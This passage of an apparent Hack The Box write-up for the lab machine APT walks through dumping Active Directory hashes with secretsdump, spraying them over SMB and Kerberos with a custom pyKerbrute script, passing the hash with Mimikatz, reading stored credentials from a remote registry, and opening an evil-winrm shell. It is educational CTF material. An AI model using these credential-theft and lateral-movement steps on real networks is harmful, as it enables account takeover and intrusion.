+</span><span class="gp">$</span>pkzip2<span class="nv">$3</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>9ac6<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>9cca<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>9cca<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip2<span class="nv">$:</span>iloveyousomuch
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>The password “iloveyousomuch” will decompress the archive.</p>
+<h3 id="dump-hashes">Dump Hashes</h3>
+<p><code class="language-plaintext highlighter-rouge">secretsdump.py</code> will take the System hive and the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and dump that hashes. There are a ton of them.</p>
+<p>I’ll save it to a file, and <code class="language-plaintext highlighter-rouge">grep</code> to get just the hashes, and there are 2000:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>secretsdump.py <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="o">&gt;</span> backup_ad_dump
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">':::'</span> backup_ad_dump | <span class="nb">wc</span> <span class="nt">-l</span>
+<span class="go">2000
+</span></code></pre></div></div>
+<p>I tried taking the admin hash and logging in with <code class="language-plaintext highlighter-rouge">crackmapexec</code> and <code class="language-plaintext highlighter-rouge">psexc.py</code>, and both returned invalid credentials:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-H</span> 2b576acbe6bcfda7294d6bd18041b8fe <span class="nt">-u</span> administrator
+<span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
+</span></code></pre></div></div>
+<h3 id="check-users">Check Users</h3>
+<p>With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to check the users. I’ll get a list of just the users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">':::'</span> backup_ad_dump | <span class="nb">awk</span> <span class="nt">-F</span>: <span class="s1">'{print $1'</span><span class="o">}</span> <span class="o">&gt;</span> <span class="nb">users</span>
+</code></pre></div></div>
+<p>Getting <code class="language-plaintext highlighter-rouge">kerbrute</code> to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the <code class="language-plaintext highlighter-rouge">hosts</code> file to define the IPv6 as apt.htb. My hosts file will show both <code class="language-plaintext highlighter-rouge">apt.htb</code> and <code class="language-plaintext highlighter-rouge">htb.local</code> as this IPv6:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dead:beef::b885:d62a:d679:573f apt.htb htb.local
+</code></pre></div></div>
+<p>Then <code class="language-plaintext highlighter-rouge">kerbrute</code> worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$ </span>kerbrute userenum <span class="nt">-d</span> apt.htb <span class="nt">--dc</span> apt.htb <span class="nb">users</span> 
+<span class="go">
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 04/02/21 - Ronnie Flathers @ropnop
+
+2021/04/02 13:54:46 &gt;  Using KDC(s):
+2021/04/02 13:54:46 &gt;   apt.htb:88
+
+2021/04/02 13:54:51 &gt;  [+] VALID USERNAME:       APT$@htb.local
+2021/04/02 13:54:52 &gt;  [+] VALID USERNAME:       Administrator@htb.local
+2021/04/02 13:58:39 &gt;  [+] VALID USERNAME:       henry.vinson@htb.local
+2021/04/02 14:11:40 &gt;  Done! Tested 2000 usernames (3 valid) in 1013.766 seconds
+</span></code></pre></div></div>
+<p>It took a while, and found that almost none of the users from the AD backup are in the current domain on APT. There’s really only one user, so that seems like a good place to look.</p>
+<h3 id="brute-hashes">Brute Hashes</h3>
+<h4 id="hash-fails">Hash Fails</h4>
+<p>Given that henry.vinson has an account in both AD environments, perhaps I can auth as that account using the hash from the backup. Unfortunately, the hash doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>~/cme smb apt.htb <span class="nt">-u</span> henry.vinson <span class="nt">-H</span> 2de80758521541d19cabba480b260e8f
+<span class="go">SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 
+</span></code></pre></div></div>
+<p>The creds are no good.</p>
+<h4 id="smb-brute-failure">SMB Brute Failure</h4>
+<p>This step is supposed to be an attack on password reuse, so I’ll take all the hashes from the AD dump and try them with the one user I have, henry.vinson.</p>
+<p>I’ll isolate the hashes into a file.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>backup_ad_dump | <span class="nb">grep</span> ::: | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f</span> 3-4 <span class="o">&gt;</span> hashes
+</code></pre></div></div>
+<p>I first tried this over SMB with <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>crackmapexec smb htb.local <span class="nt">-u</span> henry.vinson <span class="nt">-H</span> hashes
+<span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="netexec-logfail">[-]</span><span class="go"> htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE 
+...[snip]...
+</span></code></pre></div></div>
+<p>After about 60 hashes, the box stops responding entirely. It turns out it has <a href="https://github.com/glasnt/wail2ban">wail2ban</a> installed, preventing this kind of bruteforce. I had to reset the box to get it back.</p>
+<h4 id="kerberos-brute">Kerberos Brute</h4>
+<p><code class="language-plaintext highlighter-rouge">kerbrute</code> doesn’t work with hashes (it relies on Go libraries that don’t expose the hash as a valid credential). I could update it to take a list of hashes, but that would be a ton of work. On the other hand, <a href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a> is really close to what I want to do. It will take a list of users and a single hash and check them all over Kerberos. I’ll use that as a shell, and just re-write the main script.</p>
+<p>Looking at the main function for this script, it uses the command line args to fill in variables, and then calls:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file_object</span><span class="p">:</span>
+    <span class="nf">passwordspray_tcp</span><span class="p">(</span><span class="n">user_realm</span><span class="p">,</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">),</span> <span class="n">user_key</span><span class="p">,</span> <span class="n">kdc_a</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
+</code></pre></div></div>
+<p>In this case, <code class="language-plaintext highlighter-rouge">line</code> is looping over the usernames. Looking where <code class="language-plaintext highlighter-rouge">passwordspray_tcp</code> is defined, I can get the variable names to get a better idea of the arguments:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">passwordspray_tcp</span><span class="p">(</span><span class="n">user_realm</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">user_key</span><span class="p">,</span> <span class="n">kdc_a</span><span class="p">,</span> <span class="n">orgin_key</span><span class="p">):</span>
+</code></pre></div></div>
+<p>I’ll write my own main that loops over hashes, calling <code class="language-plaintext highlighter-rouge">passwordspray_tcp</code> with the same username and different hashes, and let that function handle the check and printing of success. My main bit looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">5</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Use Kerberos pre-authentication to test a single username with a list of password hashes.</span><span class="sh">'</span><span class="p">)</span>                                                    
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Reference:</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">  https://github.com/ropnop/kerbrute</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">  https://github.com/mubix/pykek</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">  https://github.com/3gstudent/pyKerbrute</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Author: 0xdf</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage:</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s"> %s &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;username&gt; &lt;hash file&gt;</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s"> %s 192.168.1.1 test.com administrator hashes.txt</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">kdc_a</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>     
+    <span class="n">user_realm</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">upper</span><span class="p">()</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] DomainControlerAddr: %s</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">kdc_a</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] DomainName:          %s</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">user_realm</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Username:            %s</span><span class="sh">'</span><span class="o">%</span><span class="p">(</span><span class="n">username</span><span class="p">))</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Using TCP to test a single username with list of hashes.</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">hashes</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">map</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">strip</span><span class="p">,</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()))</span>
+
+    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">hashes</span><span class="p">:</span>
+        <span class="n">user_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">RC4_HMAC</span><span class="p">,</span> <span class="n">h</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">))</span>
+        <span class="nf">passwordspray_tcp</span><span class="p">(</span><span class="n">user_realm</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">user_key</span><span class="p">,</span> <span class="n">kdc_a</span><span class="p">,</span> <span class="n">h</span><span class="p">)</span>  
+</code></pre></div></div>
+<p>I’ll need to run this out of the same directory as it locally imports some crypto stuff, and I’ll use legacy Python, as those libraries choke otherwise. It finds a hash that works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python2 kerbBruteHash.py apt.htb htb.local henry.vinson ~/hackthebox/apt-10.10.10.213/hashes-ntlm 
+<span class="go">[*] DomainControlerAddr: apt.htb
+[*] DomainName:          HTB.LOCAL
+[*] Username:            henry.vinson
+[*] Using TCP to test a single username with list of hashes.
+[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+</span></code></pre></div></div>
+<h3 id="remote-access">Remote Access</h3>
+<h4 id="from-windows">From Windows</h4>
+<p>henry.vinson doesn’t have permissions to do WinRM and isn’t admin (so no <code class="language-plaintext highlighter-rouge">psexec</code>). Still, there are things that you can do with credentials for an unprivileged user. If I had a plaintext password, I could open a <code class="language-plaintext highlighter-rouge">cmd</code> windows using <code class="language-plaintext highlighter-rouge">runas</code> and the <code class="language-plaintext highlighter-rouge">/netonly</code> flag. This stores the given credentials in my local system memory as if I’m that remote user, and when I try to run something interacting with the remote domain, the credentials are validated at that DC. This terminal could be used to run commands that run on remote computers.</p>
+<p>Windows doesn’t provide an interface to do that authentication with a hash, but <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> does. In my Windows VM, I’ll run <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> as administrator. I’ll need to enable debug privileges:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mimikatz #</span><span class="w"> </span>privilege::debug
+<span class="go">Privilege '20' OK
+</span></code></pre></div></div>
+<p>Now I can use the <code class="language-plaintext highlighter-rouge">sekurlsa::pth</code> command to start a CMD window with the creds for htb.local/henry.vinson:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mimikatz #</span><span class="w"> </span>sekurlsa::pth /user:henry.vinson /domain:htb.local /dc:htb.local /ntlm:e53d87d42adaa3ca32bdb34a876cbffb /command:powershell
+<span class="go">user    : henry.vinson
+domain  : htb.local
+program : cmd.exe
+impers. : no
+NTLM    : e53d87d42adaa3ca32bdb34a876cbffb
+  |  PID  8512
+  |  TID  1072
+  |  LSA Process was already R/W
+</span><span class="gp">  |  LUID 0 ;</span><span class="w"> </span>26311359 <span class="o">(</span>00000000:01917abf<span class="o">)</span>
+<span class="go">  \_ msv1_0   - data copy @ 000002268D405640 : OK !
+  \_ kerberos - data copy @ 000002268D6F4D08
+</span><span class="gp">   \_ des_cbc_md4       -&gt;</span><span class="w"> </span>null
+<span class="go">   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+</span><span class="gp">   \_ *Password replace @ 000002268C873828 (32) -&gt;</span><span class="w"> </span>null
+</code></pre></div></div>
+<p>This pops a new <code class="language-plaintext highlighter-rouge">cmd.exe</code> windows on my VM that has creds for henry.vinson cached.</p>
+<p>There wasn’t a ton I could do as henry.vinson, but I was able to <a href="https://itfordummies.net/2016/09/06/read-remote-registry-powershell/">remote access the registry</a>, but only the HKCU hive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Microsoft.Win32.RegistryKey</span><span class="p">]::</span><span class="n">OpenRemoteBaseKey</span><span class="p">(</span><span class="s1">'LocalMachine'</span><span class="p">,</span><span class="w"> </span><span class="s1">'htb.local'</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="p">)</span><span class="w">
+</span><span class="go">Exception calling "OpenSubKey" with "1" argument(s): "Requested registry access is not allowed."
+At line:1 char:1
++ $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : SecurityException
+
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Microsoft.Win32.RegistryKey</span><span class="p">]::</span><span class="n">OpenRemoteBaseKey</span><span class="p">(</span><span class="s1">'CurrentUser'</span><span class="p">,</span><span class="w"> </span><span class="s1">'htb.local'</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>In the output above I went for a key I know well from malware persistence, and there was nothing there, but it shows that I can access HKCU. That works because henry.vinson is currently logged onto APT, as shown by <code class="language-plaintext highlighter-rouge">Get-NetSession</code> from <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="n">Get-NetSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">htb.local</span><span class="w">
+</span><span class="go">
+
+sesi10_cname     : \\[dead:beef:2::1007]
+sesi10_username  : henry.vinson
+sesi10_time      : 153
+sesi10_idle_time : 0
+ComputerName     : htb.local
+</span></code></pre></div></div>
+<p>Looking around HKCU, there’s an interesting bit of software that jumped out, <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE'</span><span class="p">)</span><span class="o">.</span><span class="nf">getSubkeyNames</span><span class="p">()</span><span class="w">
+</span><span class="go">GiganticHostingManagementSystem
+Microsoft
+Policies
+RegisteredApplications
+VMware, Inc.
+Wow6432Node
+Classes
+</span></code></pre></div></div>
+<p>This key has two values, which look to be creds for henry.vinson_adm:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE\GiganticHostingManagementSystem'</span><span class="p">)</span><span class="o">.</span><span class="nf">getValueNames</span><span class="p">()</span><span class="w">
+</span><span class="go">UserName
+PassWord
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE\GiganticHostingManagementSystem'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="s1">'UserName'</span><span class="p">)</span><span class="w">
+</span><span class="go">henry.vinson_adm
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="nv">$reg</span><span class="o">.</span><span class="nf">OpenSubKey</span><span class="p">(</span><span class="s1">'SOFTWARE\GiganticHostingManagementSystem'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="s1">'Password'</span><span class="p">)</span><span class="w">
+</span><span class="go">G1#Ny5@2dvht
+</span></code></pre></div></div>
+<h4 id="from-linux">From Linux</h4>
+<p>Impacket has a script, <code class="language-plaintext highlighter-rouge">reg.py</code>, which will do remote reg reads and can take a hash as auth. It took a minute to get the syntax right, and looking at the help to notice that the Current User hive is referred to as <code class="language-plaintext highlighter-rouge">HKU</code> and not <code class="language-plaintext highlighter-rouge">HKCU</code>, but it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>reg.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb <span class="nt">-dc-ip</span> htb.local htb.local/henry.vinson@htb.local query <span class="nt">-keyName</span> HKU<span class="se">\\</span>SOFTWARE
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE
+HKU\SOFTWARE\GiganticHostingManagementSystem
+HKU\SOFTWARE\Microsoft
+HKU\SOFTWARE\Policies
+HKU\SOFTWARE\RegisteredApplications
+HKU\SOFTWARE\VMware, Inc.
+HKU\SOFTWARE\Wow6432Node
+HKU\SOFTWARE\Classes
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>reg.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb <span class="nt">-dc-ip</span> htb.local htb.local/henry.vinson@htb.local query <span class="nt">-keyName</span> HKU<span class="se">\\</span>SOFTWARE<span class="se">\\</span>GiganticHostingManagementSystem
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE\GiganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>The “_adm” in the username suggests this account will have admin level access of some kind, and it does at least have permissions to WinRM. I’ll get a shell with <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> htb.local <span class="nt">-u</span> henry.vinson_adm <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
+<span class="go">
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt;
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop&gt;</span><span class="w"> </span><span class="nf">cat</span> <span class="nf">user.txt</span>
+<span class="go">464d91e8************************
+</span></code></pre></div></div>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="powershell-history">PowerShell History</h4>
+<p>There’s not much on the host I can see as henry.vinson_adm. The only users on the box are the two henry.vinson accounts and the administrator account.</p>
+<p>There is a <a href="/2018/11/08/powershell-history-file.html">PowerShell history file</a> in the henry.vinson_adm account’s directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt;</span><span class="w"> </span><span class="nf">ls</span>
+<span class="go">
+
+    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/10/2020  10:58 AM            458 ConsoleHost_history.txt
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt;</span><span class="w"> </span><span class="nf">cat</span> <span class="nf">ConsoleHost_history.txt</span>
+<span class="go">$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
+</span></code></pre></div></div>
+<p>These commands are a hint. Interestingly, the timestamp on this file is 11 days after release, so this perhaps was a hint added after such a long initial blood time. The hint is to look at <code class="language-plaintext highlighter-rouge">lmcompatibilitylevel</code>. According to the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">docs</a>, level of <code class="language-plaintext highlighter-rouge">2</code> means:</p>
+<blockquote>
